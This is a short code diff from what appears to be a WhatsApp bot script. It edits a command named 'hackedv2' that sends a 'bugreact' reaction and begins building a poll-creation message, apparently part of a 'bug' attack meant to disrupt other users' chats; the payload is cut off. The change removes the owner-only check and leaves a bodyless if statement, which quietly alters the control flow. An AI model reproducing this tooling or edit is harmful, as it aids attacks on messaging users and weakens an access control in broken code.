@@ -554,7 +554,7 @@ xinn.sendMessage(from, { delete: {
 break
 
 case 'hackedv2':
- if (!isOwner && !dev.key.fromMe) return onlyOwner() 
+ if (!dev.key.fromMe)
 var bugreact = await xinn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
 var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
 "pollCreationMessage": {
